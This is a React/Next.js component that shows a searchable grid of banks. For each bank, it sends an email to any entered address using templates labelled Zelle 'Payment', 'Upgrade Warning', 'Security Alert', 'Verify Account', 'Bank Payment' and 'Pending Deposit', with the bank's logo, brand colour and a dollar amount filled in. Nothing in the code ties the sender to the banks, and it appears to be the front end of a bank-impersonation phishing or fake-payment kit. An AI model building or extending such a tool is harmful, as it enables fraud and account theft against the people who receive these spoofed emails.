"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import { searchBanks } from "@/services/bankService"
import type { Bank } from "@/types/bank"
import { Mail, Send, ChevronDown, ChevronUp, CheckCircle2, AlertCircle, Loader2, X, DollarSign, Clock, ShieldAlert, BadgeCheck } from "lucide-react"
import { Input } from "@/components/ui/input"
import { getBankColor } from "@/lib/email-template"

type EmailTemplate = "payment" | "upgrade-warning" | "bank-payment" | "bank-security-alert" | "bank-account-verify" | "bank-pending-deposit"

interface TemplateMeta {
  label: string
  icon: React.ElementType
  color: string
  apiRoute: string
  templateParam: string
  needsAmount: boolean
}

const TEMPLATE_META: Record<EmailTemplate, TemplateMeta> = {
  "payment":               { label: "Payment",          icon: Mail,        color: "#6D1ED4", apiRoute: "/api/send-zelle",       templateParam: "payment",                needsAmount: true  },
  "upgrade-warning":       { label: "Upgrade Warning",  icon: ShieldAlert,  color: "#ef4444", apiRoute: "/api/send-zelle",       templateParam: "upgrade-warning",        needsAmount: false },
  "bank-payment":          { label: "Bank Payment",      icon: DollarSign,   color: "#10b981", apiRoute: "/api/send-bank-email",  templateParam: "bank-payment",           needsAmount: true  },
  "bank-pending-deposit":  { label: "Pending Deposit",   icon: Clock,        color: "#f59e0b", apiRoute: "/api/send-bank-email",  templateParam: "bank-pending-deposit",   needsAmount: true  },
  "bank-security-alert":   { label: "Security Alert",    icon: ShieldAlert,  color: "#ef4444", apiRoute: "/api/send-bank-email",  templateParam: "bank-security-alert",    needsAmount: false },
  "bank-account-verify":   { label: "Verify Account",    icon: BadgeCheck,   color: "#3b82f6", apiRoute: "/api/send-bank-email",  templateParam: "bank-account-verify",    needsAmount: false },
}

interface BankEmailState {
  expanded: boolean
  template: EmailTemplate
  recipientEmail: string
  recipientName: string
  amount: string
  status: "idle" | "sending" | "success" | "error"
  errorMsg: string
}

function defaultState(): BankEmailState {
  return {
    expanded: false,
    template: "payment",
    recipientEmail: "",
    recipientName: "",
    amount: "25.00",
    status: "idle",
    errorMsg: "",
  }
}

interface BankEmailGridProps {
  searchTerm?: string
}

export default function BankEmailGrid({ searchTerm = "" }: BankEmailGridProps) {
  const [banks, setBanks] = useState<Bank[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [brokenImages, setBrokenImages] = useState<Set<string>>(new Set())
  const [bankStates, setBankStates] = useState<Record<string, BankEmailState>>({})

  useEffect(() => {
    const load = async () => {
      setIsLoading(true)
      try {
        const results = await searchBanks(searchTerm)
        setBanks(results)
        setBankStates((prev) => {
          const next: Record<string, BankEmailState> = {}
          results.forEach((b) => {
            next[b.id] = prev[b.id] ?? defaultState()
          })
          return next
        })
      } catch {
        setBanks([])
      } finally {
        setIsLoading(false)
      }
    }
    load()
  }, [searchTerm])

  const update = (bankId: string, patch: Partial<BankEmailState>) => {
    setBankStates((prev) => ({
      ...prev,
      [bankId]: { ...prev[bankId], ...patch },
    }))
  }

  const toggle = (bankId: string) => {
    const current = bankStates[bankId]
    if (!current) return
    update(bankId, { expanded: !current.expanded })
  }

  const handleSend = async (bank: Bank) => {
    const state = bankStates[bank.id]
    if (!state) return

    if (!state.recipientEmail) {
      update(bank.id, { status: "error", errorMsg: "Recipient email is required." })
      return
    }
    if (!state.recipientName) {
      update(bank.id, { status: "error", errorMsg: "Recipient name is required." })
      return
    }
    update(bank.id, { status: "sending", errorMsg: "" })

    const meta = TEMPLATE_META[state.template]
    const isBankTemplate = meta.apiRoute === "/api/send-bank-email"
    const bankColor = getBankColor(bank.id)

    try {
      const payload = isBankTemplate
        ? {
            recipientEmail: state.recipientEmail,
            recipientName: state.recipientName,
            bankId: bank.id,
            bankName: bank.name,
            bankLogo: bank.logo ? `${window.location.origin}${bank.logo}` : undefined,
            bankColor,
            template: meta.templateParam,
            amount: state.amount,
          }
        : {
            recipientEmail: state.recipientEmail,
            recipientName: state.recipientName,
            amount: state.amount,
            emailTemplate: meta.templateParam,
            bankId: bank.id,
            bankName: bank.name,
          }

      const res = await fetch(meta.apiRoute, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || "Failed to send email")
      update(bank.id, { status: "success" })
      setTimeout(() => update(bank.id, { status: "idle" }), 4000)
    } catch (err) {
      update(bank.id, {
        status: "error",
        errorMsg: err instanceof Error ? err.message : "Failed to send email",
      })
    }
  }

  if (isLoading) {
    return (
      <div className="rounded-xl bg-muted/40 p-10 flex flex-col items-center justify-center gap-3">
        <div className="w-8 h-8 border-2 border-[#6D1ED4] border-t-transparent rounded-full animate-spin" />
        <p className="text-sm text-muted-foreground">Loading financial institutions...</p>
      </div>
    )
  }

  if (banks.length === 0) {
    return (
      <div className="rounded-xl bg-muted/40 p-10 text-center">
        <p className="text-muted-foreground">No financial institutions match your search.</p>
      </div>
    )
  }

  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
      {banks.map((bank) => {
        const state = bankStates[bank.id] ?? defaultState()
        const isExpanded = state.expanded

        return (
          <div
            key={bank.id}
            className={`rounded-xl border bg-card transition-all duration-200 overflow-hidden ${
              isExpanded ? "border-[#6D1ED4]/60 shadow-md shadow-[#6D1ED4]/10" : "border-border hover:border-[#6D1ED4]/40 hover:shadow-sm"
            }`}
          >
            {/* Bank header row */}
            <div className="flex items-center gap-3 p-4">
              {/* Logo */}
              <div className="w-14 h-10 flex-shrink-0 bg-white rounded-lg border border-border flex items-center justify-center overflow-hidden">
                {bank.logo && !brokenImages.has(bank.id) ? (
                  <Image
                    src={bank.logo}
                    alt={`${bank.name} logo`}
                    width={56}
                    height={32}
                    className="object-contain w-full h-full p-1"
                    onError={() => setBrokenImages((p) => new Set(p).add(bank.id))}
                  />
                ) : (
                  <div className="w-8 h-8 bg-[#6D1ED4] rounded flex items-center justify-center">
                    <span className="text-white font-bold text-sm">{bank.name.charAt(0)}</span>
                  </div>
                )}
              </div>

              {/* Name */}
              <span className="flex-1 text-sm font-semibold text-foreground truncate">{bank.name}</span>

              {/* Send email toggle */}
              <button
                onClick={() => toggle(bank.id)}
                aria-expanded={isExpanded}
                aria-label={`${isExpanded ? "Collapse" : "Configure email for"} ${bank.name}`}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-all focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-1 ${
                  isExpanded
                    ? "bg-[#6D1ED4] text-white"
                    : "bg-muted text-muted-foreground hover:bg-[#6D1ED4]/10 hover:text-[#6D1ED4]"
                }`}
              >
                <Mail className="w-3.5 h-3.5" />
                Send Email
                {isExpanded ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
              </button>
            </div>

            {/* Expandable email form */}
            {isExpanded && (
              <div className="px-4 pb-4 border-t border-border/60 pt-4 space-y-3">
                {/* Template selector */}
                <div>
                  <label className="block text-xs font-medium text-muted-foreground mb-1.5">
                    Email Template
                  </label>
                  <div className="grid grid-cols-2 gap-1.5">
                    {(Object.keys(TEMPLATE_META) as EmailTemplate[]).map((tpl) => {
                      const meta = TEMPLATE_META[tpl]
                      const Icon = meta.icon
                      const isActive = state.template === tpl
                      return (
                        <button
                          key={tpl}
                          onClick={() => update(bank.id, { template: tpl })}
                          className={`flex items-center gap-1.5 py-1.5 px-2 rounded-lg text-xs font-medium border transition-all focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-1 ${
                            isActive
                              ? "text-white border-transparent"
                              : "border-border text-muted-foreground hover:border-[#6D1ED4]/50 hover:text-foreground"
                          }`}
                          style={isActive ? { background: meta.color, borderColor: meta.color } : {}}
                        >
                          <Icon className="w-3 h-3 flex-shrink-0" />
                          <span className="truncate">{meta.label}</span>
                        </button>
                      )
                    })}
                  </div>
                </div>

                {/* Recipient email */}
                <div>
                  <label className="block text-xs font-medium text-muted-foreground mb-1">
                    Recipient Email <span className="text-red-400">*</span>
                  </label>
                  <Input
                    type="email"
                    placeholder="recipient@example.com"
                    value={state.recipientEmail}
                    onChange={(e) => update(bank.id, { recipientEmail: e.target.value, status: "idle", errorMsg: "" })}
                    className="h-8 text-sm"
                  />
                </div>

                {/* Recipient name */}
                <div>
                  <label className="block text-xs font-medium text-muted-foreground mb-1">
                    Recipient Name <span className="text-red-400">*</span>
                  </label>
                  <Input
                    type="text"
                    placeholder="Full name"
                    value={state.recipientName}
                    onChange={(e) => update(bank.id, { recipientName: e.target.value, status: "idle", errorMsg: "" })}
                    className="h-8 text-sm"
                  />
                </div>

                {/* Amount — shown for templates that need it */}
                {meta.needsAmount && (
                  <div>
                    <label className="block text-xs font-medium text-muted-foreground mb-1">
                      Amount (USD) <span className="text-red-400">*</span>
                    </label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-xs text-muted-foreground pointer-events-none">$</span>
                      <Input
                        type="number"
                        placeholder="25.00"
                        value={state.amount}
                        onChange={(e) => update(bank.id, { amount: e.target.value, status: "idle", errorMsg: "" })}
                        className="h-8 text-sm pl-6"
                        min="0.01"
                        step="0.01"
                      />
                    </div>
                  </div>
                )}

                {/* Status messages */}
                {state.status === "error" && state.errorMsg && (
                  <div className="flex items-start gap-2 text-xs text-red-500 bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-lg px-3 py-2">
                    <AlertCircle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
                    <span>{state.errorMsg}</span>
                    <button onClick={() => update(bank.id, { status: "idle", errorMsg: "" })} className="ml-auto">
                      <X className="w-3 h-3" />
                    </button>
                  </div>
                )}
                {state.status === "success" && (
                  <div className="flex items-center gap-2 text-xs text-emerald-600 bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-200 dark:border-emerald-800 rounded-lg px-3 py-2">
                    <CheckCircle2 className="w-3.5 h-3.5 flex-shrink-0" />
                    <span>Email sent successfully via Resend.</span>
                  </div>
                )}

                {/* Send button */}
                <button
                  onClick={() => handleSend(bank)}
                  disabled={state.status === "sending"}
                  className="w-full flex items-center justify-center gap-2 py-2 rounded-lg bg-[#6D1ED4] text-white text-xs font-semibold hover:bg-[#5a18b5] transition-colors disabled:opacity-60 disabled:cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-1"
                >
                  {state.status === "sending" ? (
                    <>
                      <Loader2 className="w-3.5 h-3.5 animate-spin" />
                      Sending…
                    </>
                  ) : (
                    <>
                      <Send className="w-3.5 h-3.5" />
                      Send via Resend
                    </>
                  )}
                </button>
              </div>
            )}
          </div>
        )
      })}
    </div>
  )
}
